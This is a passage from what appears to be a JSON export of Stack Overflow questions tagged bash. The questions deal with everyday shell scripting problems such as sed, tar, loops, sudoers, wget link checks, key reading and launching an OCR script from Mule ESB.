     -re \\\".*Are you sure you want to continue connecting.*\\\" {send \\\"yes\\n\\\"; exp_continue}\n                        -re \\\".*$PROMPT.*\\$.*\\\"  {puts $chan \\\"$IPSTART$IPEND\\n\\\"; send \\\"exit\\n\\\"}\n                }\n\n        close $chan\n\"\n\ndone\n</code></pre>\n\n<p>I'm wondering if there might be an issue with the quoting, but I can't figure it out.</p>\n\n<p>For reference, this is the example from <a href=\"http://www.tcl.tk/man/tcl8.4/TclCmd/puts.htm\" rel=\"nofollow\">http://www.tcl.tk/man/tcl8.4/TclCmd/puts.htm</a></p>\n\n<pre><code>set chan [open my.log a]\nset timestamp [clock format [clock seconds]]\nputs $chan \"$timestamp - Hello, World!\"\nclose $chan\n</code></pre>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13053857,"title":"Add prefix to every single hostname in Bash","body":"<p>If I have a string like: <code>a.com b.com c.com</code></p>\n\n<p>How can I add to the front of it to make it like <code>*.a.com *.b.com *.c.com</code> using Bash?</p>\n"},{"tags":["git","bash","shell","windows-xp","msysgit"],"answer_count":3,"favorite_count":3,"up_vote_count":5,"down_vote_count":0,"view_count":2110,"score":5,"question_id":5851611,"title":"Git sh.exe process forking issue on windows XP, slow?","body":"<p>Git is essential to my workflow. I run MSYS Git on Windows XP on my quad core machine with 3GB of RAM, and normally it is responsive and zippy. </p>\n\n<p>Suddenly an issue has cropped up whereby it takes >30 seconds to run any command from the Git Bash command prompt, including <code>ls</code> or <code>cd</code>. Interestingly, from the bash prompt it looks likes <code>ls</code> runs fairly quickly, I can then see the output from <code>ls</code>, but it then takes ~30 seconds for the prompt to return. If I switch to the windows command prompt (by running <code>cmd</code> from the start menu) git related commands also take forever, even just to run. For example <code>git status</code> can take close to a minute before anything happens. Sometimes the processes simply don't finish. </p>\n\n<p>Note that I have \"MSYS Git\" installed as well as regular \"MSYS\" for things like <code>MinGW</code> and <code>make</code>. </p>\n\n<p>I believe the problem is related to <code>sh.exe</code> located in <code>C:\\Program Files\\Git\\bin</code>. When I run <code>ls</code> from the bash prompt, or  when I invoke <code>git</code> from the windows prompt, task manager shows up to four instances of <code>sh.exe</code> processes that come and go.  </p>\n\n<p>Here I am waiting for <code>ls</code> to return and you can see the task manager has <code>git.exe</code> running and four instances of <code>sh.exe</code>:\n<img src=\"http://i.stack.imgur.com/VSp0a.png\" alt=\"Here I am waiting for ls to return and you can see the task manager has git.exe running and four instances of sh.exe\"></p>\n\n<p>If I <code>ctrl-c</code> in the middle of an <code>ls</code> I sometimes get errors that include:</p>\n\n<pre><code>sh.exe\": fork: Resource temporarily unavailable\n      0 [main] sh.exe\" 1624 proc_subproc: Couldn't duplicate my handle&lt;0x6FC&gt; fo\nr pid 6052, Win32 error 5\nsh.exe\": fork: Resource temporarily unavailable\n</code></pre>\n\n<p>Or for <code>git status</code>:\n$ git status</p>\n\n<pre><code>sh.exe\": fork: Resource temporarily unavailable\nsh.exe\": fork: Resource temporarily unavailable\nsh.exe\": fork: Resource temporarily unavailable\nsh.exe\": fork: Resource temporarily unavailable\n</code></pre>\n\n<p><em>Can I fix this so that git runs quickly again, and if so how?</em> </p>\n\n<p>Things I have tried:</p>\n\n<ul>\n<li>Reboot</li>\n<li>Upgrade MSYS Git to most recent version &amp; Reboot</li>\n<li>Upgrade MSYS to most recent version &amp; Reboot </li>\n<li>Uninstall  MSYS &amp; uninstall and reinstall MSYS Git alone &amp; Reboot </li>\n</ul>\n\n<p>I'd very much like to not wipe my box and reinstall Windows, but I will if I can't get this fixed. I can no longer code if it takes me >30 s to run <code>git status</code> or <code>cd.</code></p>\n"},{"tags":["bash","rm"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":461,"score":3,"question_id":10247472,"title":"How to prevent rm from reporting that a file was not found?","body":"<p>I am using <code>rm</code> within a BASH script to delete many files. Sometimes the files are not present, so it reports many errors. I do not need this message. I have searched the man page for a command to make <code>rm</code> quiet, but the only option I found is <code>-f</code>, which from the description, \"ignore nonexistent files, never prompt\", seems to be the right choice, but the name does not seem to fit, so I am concerned it might have unintended consequences.</p>\n\n<ul>\n<li>Is the <code>-f</code> option the correct way to silence <code>rm</code>? Why isn't it called <code>-q</code>?</li>\n<li>Does this option do anything else?</li>\n</ul>\n"},{"tags":["file","bash","scripting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13053063,"title":"Bash - Source a file with \"/\"","body":"<p>I have a cache in the filesystem which I implemented this way.</p>\n\n<ol>\n<li><p>To store a value I do something like</p>\n\n<pre><code>echo \"\"$KEY1\"_\"$KEY2\"=\"$VALUE\" &gt;&gt; $CACHE_DIR/$INDEX.cache\n</code></pre></li>\n<li><p>To get a value, first I source the cache file:</p>\n\n<pre><code>source $CACHE_DIR/$INDEX.cache\n</code></pre>\n\n<p>and then I echo the <code>\"$KEY1\"_\"$KEY2\"</code></p></li>\n</ol>\n\n<p>Cache example:</p>\n\n<pre><code>foo1_foo2=wohohhowwho\n</code></pre>\n\n<p>The problem with this, is that I have some keys that have a \"/\" in it, so when I have this:</p>\n\n<pre><code>foo3_foo/4=wohohhowwho\n</code></pre>\n\n<p>and source the file, it says</p>\n\n<pre><code>cache/15637.cache: line 1: foo3_foo/4=wohohhowwho: No such file or directory\n</code></pre>\n\n<p>because of the <code>/</code>. </p>\n\n<p>Is there an option to the source command to not search in the path for files and only take in count the content as vars? I could escape the <code>/</code>, but is there another way?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":13042734,"title":"Parsing command line arguments in bash - strange behavior","body":"<pre><code>#!/bin/bash\n\nfor arg\ndo\n        echo \"$arg\"\ndone\n</code></pre>\n\n<p>In file called compile. </p>\n\n<p>I tried this:</p>\n\n<pre><code>compile ha -aa -bb -cc -dd -ee -ff -gg\nha\n-aa\n-bb\n-cc\n-dd\n\n-ff\n-gg\n</code></pre>\n\n<p>Why does -ee not show up?\nIn fact,  it seems that -[e]+ does not show up.</p>\n"},{"tags":["linux","bash","shell","tar"],"answer_count":5,"favorite_count":2,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":13041068,"title":"How to grep for a pattern in the files in tar archive without filling up disk space","body":"<p>I have a tar archive which is very big ~ 5GB.</p>\n\n<p>I want to grep for a pattern on all files (and also print the name of the file that has the pattern ) in the archive but do not want to fill up my disk space by extracting the archive.</p>\n\n<p>Anyway I can do that?</p>\n\n<p>I tried these, but this does not give me the file names that contain the pattern, just the matching lines:</p>\n\n<pre><code>tar -O -xf test.tar.gz | grep 'this'\ntar -xf test.tar.gz --to-command='grep awesome'\n</code></pre>\n\n<p>Also where is this feature of tar documented? tar xf test.tar $FILE</p>\n"},{"tags":["bash","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":13051729,"title":"Using sed and delete last line","body":"<p>I'm using sed command to delete the first two line, but when I redirect the content to a file appear the number of rows. I don't know how can I delete it.</p>\n\n<p>I execute:</p>\n\n<pre><code>sed '7,9d' mi_fichero.txt\n</code></pre>\n\n<p>And the result is:</p>\n\n<p>(I write the last lines)</p>\n\n<pre><code> /XTENT/D3/REPOSITORY/20120305/2201/65601/84/1330951636844_D3_448987414829688495_.indd.gz\n /XTENT/D3/REPOSITORY/20120308/2201/65601/22/1331198783835_D3_3411473776849856760_.indd.gz\n /XTENT/D3/REPOSITORY/20120308/2201/65601/158/1331220874606_D3_2742969984589497048_.indd.gz\n /XTENT/D3/REPOSITORY/20120313/2201/65601/0/1331626743284_D3_7551629114585379089_.indd.gz\n /XTENT/D3/REPOSITORY/20120309/2201/65601/92/1331295878839_D3_4724445611762228808_.indd.gz\n(60 rows)\n</code></pre>\n\n<p>I want to delete the line (60 rows), Anybody can help me ?</p>\n\n<p>Thanks :) </p>\n"},{"tags":["bash","if-statement","case"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13048994,"title":"case or If string contains word1 and word2","body":"<p>In this example I want it to know if $@ contains two words/symbols \"load\" and \"/\"</p>\n\n<p>for one word/symbol this works</p>\n\n<pre><code>    case \"$@\" in */*)\n    ;;\n    echo \"going to do stuff\"\n*)\n    echo \"will do something else\"\n    ;;\nesac\n</code></pre>\n\n<p>or</p>\n\n<pre><code>string='My string';\n\nif [[ \"$string\" == *My* ]]\nthen\n  echo \"It's there!\";\nfi\n</code></pre>\n\n<p>But if two words/symbols appear at random places I cant figure out how to do it.</p>\n\n<p>Update:</p>\n\n<p>The input will the module command. In this case I want to know if it is the module load with or without / that indicate version. the command will look like this</p>\n\n<p>1) module load appname/1.1.1 or<br>\n2) module load appname<br>\n3) module (not load) (list, avail etc)  </p>\n\n<p>It is number 1 I am interested in for now.<br>\n3 will in some cases be variation of 1.<br>\n2 will be run as is but will include a message to the user</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":13034404,"title":"How do I subtract a word from the output in bash","body":"<p>I made a simple bash script to convert movies from .avi to .mp4 but now I want to do two more things.</p>\n\n<ol>\n<li>Have the output file have only *.mp4 rather than *.avi.mp4</li>\n<li>Delete the old file after the conversion is completed.  </li>\n</ol>\n\n<p>Here is my script.</p>\n\n<pre><code>#!/bin/bash\n\n\navconv -i \"$1\" -c:v libx264 -c:a copy -sn -crf 24 \"$1\".mp4\n</code></pre>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":61,"score":3,"question_id":13038023,"title":"BASH Loop how to go about it?","body":"<p>Ok I have a tower of 8 HDD's and I'm trying to make a script that will loop through them and make a text file with the results (info from hdparm) for each HDD in there own folders. How can I now loop this script to go for sdc -> /Bay2, sdd -> /Bay3, sde -> /Bay4 ect ect</p>\n\n<p>This is working now for one HDD just need to loop it for the other 7</p>\n\n<pre><code>if [ -c /dev/sdb ];\nthen\nsudo hdparm -I /dev/sdb &gt;&gt; /Bay1/sdb.txt\nfi\n</code></pre>\n"},{"tags":["linux","bash","shell","ubuntu"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":45,"score":-1,"question_id":13050871,"title":"Sudoers file permissions","body":"<p>I'm trying to run the following command without the need for sudo:</p>\n\n<pre><code>echo 1 | sudo tee -a /sys/block/$hd/device/delete\n</code></pre>\n\n<p>The $hd variable changes dynamically from sdb -> sdi for each one of my HDD's in my drive bay.</p>\n\n<p>I added the following line to the sudoers file:</p>\n\n<pre><code>operator ALL=/sys/block/sdb/device/delete\n</code></pre>\n\n<p>But this didn't make a difference its still asking for sudo password even if I run:</p>\n\n<pre><code>echo 1 | sudo tee -a /sys/block/sdb/device/delete\n</code></pre>\n"},{"tags":["linux","bash","pipe","supervisord"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":280,"score":2,"question_id":9404391,"title":"bash pipe & sigterm","body":"<p>I have a bash script \"script\" which roughly looks like:</p>\n\n<pre><code>#!/bin/bash\n\ncmd1 | cmd2 | cmd3\n</code></pre>\n\n<p>When I do a <code>kill script</code> (or more precisely when I do a 'stop script' in <code>supervisord</code>), not all cmd* are killed.  How can I make sure they are terminated along with the script that spawned them?</p>\n"},{"tags":["osx","bash","delete","special-characters","typing"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12335787,"title":"With iTerm2 on Mac, how to delete forward a word from cursor on command-line?","body":"<p>With iTerm2 1.0.0 on Mac OS X 10.6.8, I'd like to delete from cursor to the next end of word, i.e. deleting one word forward.  I tried <code>Alt-d</code> but this types the delta operator symbol <a href=\"http://www.wolframalpha.com/input/?i=%E2%88%82\" rel=\"nofollow\"><code>∂</code></a> and doesn't delete.  How to suppress the typing but let it delete?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":13049045,"title":"How to display the key pressed by the user?","body":"<p>please help how to add variables in this script, does anyone know? Thank you all.</p>\n\n<pre><code>#!/bin/bash\n\nARROW_UP=???    # I do not know\nARROW_DOWN=???  # I do not know\nARROW_LEFT=???  # I do not know\nARROW_RIGHT=??? # I do not know\nARROW_ENTER=??? # I do not know\n\ncase \"$KEY\" in \"$ARROW_UP\")    echo \"press the up arrow key\"\n               \"$ARROW_DOWN\")  echo \"press the down arrow key\";;\n               \"$ARROW_LEFT\")  echo \"press the left arrow key\"\n               \"$ARROW_RIGHT\") echo \"press the right arrow key\"\n               \"$ARROW_ENTER\") echo \"press the enter key\"\nesac\n</code></pre>\n"},{"tags":["bash","for-loop"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13048824,"title":"For loop using variable as condition, Bash","body":"<p>I am running the following bash code:</p>\n\n<pre><code>num=$(ls -1 $ini/*.ini | wc -l)\necho \"Running $num simulations...\"\nfor i in {1..$num};\ndo\n    echo \"a\"\ndone\n</code></pre>\n\n<p>And I get the following output:</p>\n\n<pre><code>Running 24 simulations...\na\n</code></pre>\n\n<p>It should print 24 lines of 'a', but it doesn't. What should I change? Thanks!</p>\n"},{"tags":["bash","shell","tmux"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13048740,"title":"run or send a command to a tmux pane in a running tmux session","body":"<p>I want to write a shell script which will attach to a named tmux session, select a window (or pane) in that session and run a command in that selected window (or pane). </p>\n\n<p>How do I do this from a bash script?</p>\n\n<p>I know <code>tmux new-window -n:mywindow 'exec something'</code> allows you to send commands to a freshly created window. But I need something like <code>tmux select-window -t:0 'my command'</code></p>\n\n<p>I suppose I could use <code>send-keys</code> but seems like their should be something that takes a command or list of commands that get run.</p>\n"},{"tags":["linux","bash","shell","ubuntu","sudo"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13047725,"title":"How to run device delete without sudo password?","body":"<p>I'm running the following command to shut down HDD's (changing the sd'x' depending on drive) but its always asking me to enter a password to delete the device from the folder. Is there away around this? Probably obvious and I'm missing the point :) </p>\n\n<pre><code>echo 1 | sudo tee -a /sys/block/sdb/device/delete\n</code></pre>\n"},{"tags":["bash","shell","variables","script","ls"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12806828,"title":"how to put a filename from the newest file in the directory into a variable","body":"<p>I am making a script. i need to automate a portion that looks at all the files in the directory containing the string \"HNAZXLCOM\" in the name then take the newest file with that string in the name and put the filename into a variable. </p>\n\n<p>Thanks</p>\n"},{"tags":["linux","bash","shell","script","wget"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":128,"score":4,"question_id":13042156,"title":"Shell script with Wget - If else nested inside for loop","body":"<p>I'm trying to make a shell script that reads a list of download URLs to find if they're still active.  I'm not sure what's wrong with my current script, (I'm new to this) and any pointers would be a huge help!</p>\n\n<p>user@pc:~/test# cat sites.list</p>\n\n<pre><code>http://www.google.com/images/srpr/logo3w.png\nhttp://www.google.com/doesnt.exist\nnotasite\n</code></pre>\n\n<p>Script:</p>\n\n<pre><code>#!/bin/bash\nfor i in `cat sites.list`\ndo\nwget --spider $i -b\nif grep --quiet \"200 OK\" wget-log; then\necho $i &gt;&gt; ok.txt\nelse\necho $i &gt;&gt; notok.txt\nfi\nrm wget-log\ndone\n</code></pre>\n\n<p>As is, the script outputs everything to notok.txt - (the first google site should go to ok.txt).\nBut if I run:</p>\n\n<pre><code>wget --spider http://www.google.com/images/srpr/logo3w.png -b\n</code></pre>\n\n<p>And then do:</p>\n\n<pre><code>grep \"200 OK\" wget-log\n</code></pre>\n\n<p>It greps the string without any problems.  What noob mistake did I make with the syntax?  Thanks m8s!</p>\n"},{"tags":["linux","bash","unix","pipe"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":13040430,"title":"piping split input into command","body":"<p>I'm trying to figure out a piping problem. my goal is something like this</p>\n\n<pre><code>replace $1 $2 index.html | split -d ':' | minify main.css\n</code></pre>\n\n<p>Where the output from main.css is</p>\n\n<pre><code>main.css:main.min.css\n</code></pre>\n\n<p>And index.html will go from this:</p>\n\n<pre><code>&lt;link href=\"main.css\" /&gt;\n</code></pre>\n\n<p>to this:</p>\n\n<pre><code>&lt;link href=\"main.min.css\" /&gt;\n</code></pre>\n\n<p>It's a simple example, I know, but I think it illustrates my problem.</p>\n\n<ul>\n<li>Edit 1</li>\n</ul>\n\n<p>Okay, i got the piping the wrong way around, but I still can't figure this out.</p>\n\n<p>here's a simpler example</p>\n\n<pre><code>echo 'foo:bar' | split -d ':' | replace $1 $2 -- index.html\n</code></pre>\n\n<p>is that kind of command possible?</p>\n\n<ul>\n<li>Edit 2</li>\n</ul>\n\n<p>So close!</p>\n\n<pre><code>minify css/main.css | replace $(cut -f1 -) $(cut -f2 -) index.html\n</code></pre>\n\n<p>this would work except that for some reason cut can't read STDIN :( they are returning the correct values when run normally but I need them as arguments for the replace command</p>\n"},{"tags":["linux","bash","shell","tcsh"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13046192,"title":"changing default shell in linux","body":"<p>How it is possible to change the default shell? Currently <code>env</code> command says </p>\n\n<pre><code>SHELL=/bin/tcsh\n</code></pre>\n\n<p>and I want to change that to bash</p>\n"},{"tags":["bash","variables"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13028259,"title":"Bash: variable does not get populated","body":"<p>Originally from: <a href=\"http://stackoverflow.com/questions/13024828/if-grep-finds-what-it-is-looking-fore-do-x-else-y\">IF grep finds what it is looking fore do X else Y</a> but the original question was answered.</p>\n\n<p>$@ has the value of \"Load firefox/3.6.12\"</p>\n\n<pre><code>var1=$(echo \"$@\" | grep -Eio '\\s\\w*') # Gets the application name and put it into var1\necho $var1   # is not printed should be \"firefox\"\nvar2=$(echo \"$@\" | grep -o '[^/]*$')  # Gets version name and put it into var2 \necho $var2 # prints fine\n</code></pre>\n\n<p>The regex is fine, it has worked before one time before i changed some thing</p>\n\n<p>Edit:\nThere is something wrong with</p>\n\n<pre><code>var1=$(echo \"$@\" | grep -Eio '\\s\\w*') #expected result is: firefox\n</code></pre>\n\n<p>I works fine if i use</p>\n\n<pre><code>var1=\"firefox\"\n</code></pre>\n\n<p>I must have changed something a some point.</p>\n\n<p>Edit:\nSOLUTION</p>\n\n<pre><code>echo \"Load firefox/6.12.3\" | awk ‘{print $2}’ | cut -f1 -d”/”\n</code></pre>\n\n<p>Grep is no longer used.</p>\n"},{"tags":["arrays","bash","sorting"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":43,"score":2,"question_id":13046151,"title":"Sort in bash - how to sort by characters lying middle or end of line","body":"<p>I have the following pdf files to be combined.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>20121024aC004101\n20121024a_002101\n20121024a_003101\n20121024aN006101\n20121024aA001101\n20121024a_005101\netc...\n</code></pre>\n\n<p>But my result should be in the order of 00101, 002101... i.e. sort based on 11th charater;\nanybody can help me. I am new to bash, recently started to learn.</p>\n"},{"tags":["bash","checkbox","script","arrow-keys"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":324,"score":1,"question_id":8813260,"title":"Checkboxes with bash script","body":"<p>I am trying to do a very simple bash script which emulates the behavior of checkboxes in appearance!\nI want it to show some options and move the cursor to the next checkbox according to the key press of the left or right arrow keys. I've already managed to do this using READ and Ansii escape sequences to detect the arrow keys and I use tput to move the cursor.</p>\n\n<p>My problem with this it's that I need to read a certain letter (x for instance) to be pressed and then take another action. But how can I detect this key press and at the same time detect if an arrow key it's being pressed or not??</p>\n\n<p>To detect the ansii codes I need to read 3 characters and with the X character (the key to \"select\") I need to read just one, how can I read 3 characters and at the same time read just one?</p>\n\n<p>Also I've been trying to make something so the user can JUST press the left or right arrow keys or the x key but if he presses ANY other key, nothing should happen!</p>\n\n<p>I've done this this far:</p>\n\n<pre><code>#!/bin/bash\n## Here I just print in the screen the \"form\" with the \"checkboxes\"\nfunction screen_info(){\nclear\ncat &lt;&lt;EOF\n\n    /\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_/\\_\n    ||\n    ||      1[ ]    2[ ]    3[ ]\n    ||\n    #############################\n\n\n\nEOF\n}\n\n## This function detects the arrow keys and moves the cursor\nfunction arrows(){\n\n## I use ANSII escape sequences to detect the arrow keys\nleft_arrow=$'\\x1b\\x5b\\x44'  #leftuierda\nright_arrow=$'\\x1b\\x5b\\x43' #rightecha\njust_x_key=\"\"\n\n## With tput I move the cursor accordingly\ncursor_x=14\ncursor_y=3\ntput cup $cursor_y $cursor_x\n\nwhile [ -z \"$just_x_key\" -o \"$just_x_key\" != \"$just_x_key\" ]; do\n    read -s -n3 key\n    while [ `expr length \"$key\"` -ne 3 ]; do\n        key=\"\"\n        read -s -n3 key\n        break\n    done\n    case \"$key\" in\n    $left_arrow)\n        if [ $cursor_x -gt 14 ]; then\n            cursor_x=`expr $cursor_x - 8`\n        fi\n        tput cup $cursor_y $cursor_x\n        #This is supposed to be a simple condition detecting the x key pressed wich I want to trigger something... But how to read a single character to this condition and 3 characters at the same time if the user presses the arrow key ???? =/\n        #read -s just_x_key\n        #if [ $just_x_key == x ]; then\n        #   echo X\n        #   tput cup 7 15\n        #   echo \"YOU PRESSED THE RIGHT KEY!!! =D\"\n        #fi \n        ;;\n    $right_arrow)\n        if [ $cursor_x -lt 28 ]; then\n            cursor_x=`expr $cursor_x + 8`\n        fi\n        tput cup $cursor_y $cursor_x\n        #read -s just_x_key\n        #if [ $just_x_key == x ]; then\n        #   echo X\n        #   tput cup 7 15\n        #   echo \"YOU PRESSED THE RIGHT KEY!!! =D\"\n        #fi \n        ;;\n    esac\ndone\n\nexit $?\n}\n\n\n#EXECUTION\n#=========\n\n## I just call the functions!\nscreen_info\narrows\n</code></pre>\n\n<p>Yes I know, it's not the most perfect code ever but I'm trying to learn. Suggestions will be very appreciated.</p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":59,"score":1,"question_id":13044053,"title":"Having trouble understanding what \">>\" and \"&\" are doing in this BASH line","body":"<p>I am trying to debug a script written for use in BASH.  I am a little confused as to what the following line is doing.</p>\n\n<pre><code>ffmpeg -threads 1 -f yuv4mpegpipe -i ./tmp/dvd-slideshow_temp_3203/dvdss-pipe-3203 -target ntsc-dvd -r 29.97 -an -aspect 4:3 -s 480 -y -bf 2 -f mpeg2video ./tmp/dvd-slideshow_temp_3203/video.mpg &gt;&gt; /dev/null 2&gt;&amp;1 &amp;\n</code></pre>\n\n<p>the bit that really has me confused is the last bit:</p>\n\n<pre><code>&gt;&gt; /dev/null 2&gt;&amp;1 &amp;\n</code></pre>\n\n<p>I would be grateful if someone could tell me what this line is doing.</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":836,"score":4,"question_id":5506176,"title":"bash: echo something to right end of window (right aligned)","body":"<p>I am looking for producing success/fail messages which are right aligned in bash. An example would be what apache2 produces on executing: <code>sudo /etc/init.d/apache2 reload</code> etc.  </p>\n\n<p>In above example, apache2 produces very nice and concise <code>[OK]</code> or <code>[fail]</code> message which are right aligned.</p>\n\n<p>Also, would love to know how to get the text red, in case, we are to produce a <code>[fail]</code> message.</p>\n"},{"tags":["linux","bash","filesystems","gnu"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":13025860,"title":"How to search back in directory tree on GNU/Linux for a file","body":"<p>I have few repositories and each have config.php file that contain information about database like password. I have script that connect to database using stuff from that file and need to search back in directory tree so I can call it in every nested directory.</p>\n\n<pre><code>[ -e config.php ] &amp;&amp; $(php -r 'require(\"config.php\"); echo \"mysql -u\".$config[\"db_user\"] . \" -p\".$config[\"db_pass\"] . \" \" . $config[\"db_name\"];')\n</code></pre>\n\n<p>What is easiest way to search back in directory tree using Bash?</p>\n"},{"tags":["bash","unix","replace","sed","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":13043998,"title":"sed: replace a block of text","body":"<p>I have a bunch of files, starting with a block of code and I'm trying to replace with another.</p>\n\n<p>Replace:</p>\n\n<pre><code>&lt;?php\n$r = session_start();\n(more lines)\n</code></pre>\n\n<p>With:</p>\n\n<pre><code>&lt;?php\nheader(\"Location: index.php\");\n(more lines of code)\n</code></pre>\n\n<p>So im trying to match the block with <code>sed 's/&lt;?php\\n$r = session_start();/&lt;?php\\nheader...</code> but it doesn't work. </p>\n\n<p>I would appreciate help in what is happening here and how to achieve this. I'm thinking in doing this with python instead.</p>\n\n<p>Thanks!</p>\n"},{"tags":["regex","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":13043344,"title":"Search and replace in bash using regular expressions","body":"<p>I've seen this example:</p>\n\n<pre><code>hello=ho02123ware38384you443d34o3434ingtod38384day\necho ${hello//[0-9]/}\n</code></pre>\n\n<p>Which follows this syntax: ${variable//pattern/replacement}</p>\n\n<p>Unfortunately the \"pattern\" field doesn't seem to support full regex syntax (if I use . or \\s, for example, it tries to match the literal characters).</p>\n\n<p>How can I search/replace a string using full regex syntax?</p>\n"},{"tags":["bash","ocr","mule","tesseract"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":13039604,"title":"Running shell scripts from Mule ESB","body":"<p>I have a flow set up to recognize when a file is dropped into a directory. Next I need to run a Bash script that processes the file (fairly intensive processing). The script grabs a PDF, creates a temporary directory, breaks the PDF into separate PNG files, runs an OCR processor against each image, converts the result to single-page PDFs, then merges all of the PDFs into a single multi-page PDF with the text layer from the OCR.</p>\n\n<p>The problem is, the Bash script chokes after 10 concurrent transformations are triggered. Right now I have Mule ESB listening for new files, then triggering the script for each file, passing the appropriate parameters. Unfortunately, Mule has two tasks, listen -> trigger. We are going to have over 200 files in that directory that need to be queued for processing, preferably 5 at a time. How do I get Mule to limit the number of concurrent processes triggered?</p>\n\n<p>Below is my initial draft Flow:</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n\n&lt;mule xmlns:cxf=\"http://www.mulesoft.org/schema/mule/cxf\" xmlns:scripting=\"http://www.mulesoft.org/schema/mule/scripting\" xmlns:http=\"http://www.mulesoft.org/schema/mule/http\" xmlns:file=\"http://www.mulesoft.org/schema/mule/file\" xmlns=\"http://www.mulesoft.org/schema/mule/core\" xmlns:doc=\"http://www.mulesoft.org/schema/mule/documentation\" xmlns:spring=\"http://www.springframework.org/schema/beans\" version=\"CE-3.3.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"\nhttp://www.mulesoft.org/schema/mule/file http://www.mulesoft.org/schema/mule/file/current/mule-file.xsd \nhttp://www.mulesoft.org/schema/mule/scripting http://www.mulesoft.org/schema/mule/scripting/current/mule-scripting.xsd \nhttp://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-current.xsd \nhttp://www.mulesoft.org/schema/mule/core http://www.mulesoft.org/schema/mule/core/current/mule.xsd \nhttp://www.mulesoft.org/schema/mule/cxf http://www.mulesoft.org/schema/mule/cxf/current/mule-cxf.xsd \nhttp://www.mulesoft.org/schema/mule/http http://www.mulesoft.org/schema/mule/http/current/mule-http.xsd \"&gt;\n    &lt;configuration&gt;\n    &lt;default-threading-profile doThreading=\"false\"/&gt;\n  &lt;/configuration&gt;\n\n    &lt;queued-asynchronous-processing-strategy name=\"limitThreads\" maxThreads=\"2\"/&gt;\n\n    &lt;flow name=\"Poll_DirectoryFlow1\" doc:name=\"Poll_DirectoryFlow1\" processingStrategy=\"limitThreads\"&gt;\n        &lt;file:inbound-endpoint path=\"/home/administrator/Downloads/Input\" responseTimeout=\"10000\" doc:name=\"File\" pollingFrequency=\"5000\" fileAge=\"5000\"&gt;\n\n        &lt;/file:inbound-endpoint&gt;\n        &lt;scripting:component doc:name=\"Script\"&gt;\n            &lt;scripting:script engine=\"Groovy\"&gt;\n                &lt;property key=\"originalFilename\" value=\"#[header:originalFilename]\"/&gt;\n                &lt;scripting:text&gt;&lt;![CDATA[def filename = message.getInboundProperty('originalFilename')\n                                                        println \"$filename\"\n                                                        def directory = message.getInboundProperty('directory')\n                                                        println \"$directory\"\n                                                        \"mkdir processed\".execute()\n                                                        def command = [\"/home/administrator/ocr.sh\", \"$directory/$filename\", \"/home/administrator/Downloads/Output/$filename\"]\n                                                        println \"$command\"\n                                                        def proc = \"pwd\".execute()\n                                                        command.execute()\n                                                        proc.waitFor()\n                                                        println \"${proc.in.text}\"]]&gt;&lt;/scripting:text&gt;\n            &lt;/scripting:script&gt;\n        &lt;/scripting:component&gt;\n        &lt;echo-component doc:name=\"Echo\"/&gt;        \n    &lt;/flow&gt;\n&lt;/mule&gt;\n</code></pre>\n\n<p>Here is the actual Bash script (gives some hints on what tools we are using):</p>\n\n<pre><code>#!/bin/bash\n\n#Setting variables\nPARAM=$#\nTMPDIR=./split\nINFILENAME=${1##*/}\nOUTFILENAME=${2##*/}\necho \"1 is $1\"\necho \"2 is $2\"\necho \"infilename is $INFILENAME\"\necho \"outfilename is 